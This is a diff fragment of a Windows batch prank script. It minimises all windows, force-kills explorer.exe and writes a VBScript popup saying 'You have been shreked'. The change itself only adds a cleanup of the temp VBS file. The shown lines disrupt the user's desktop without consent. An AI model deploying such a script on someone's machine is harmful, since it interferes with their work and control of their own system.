@@ -18,6 +18,10 @@ start "" /min powershell -command "(new-object -com shell.application).minimizea
 
 taskkill /F /im explorer.exe
 
+if exist %temp%\shrek_popup.vbs (
+	del /F /Q %temp%\shrek_popup.vbs
+)
+
 (
 echo Set objShell = WScript.CreateObject("WScript.Shell")
 echo MsgBox "You have been shreked :("
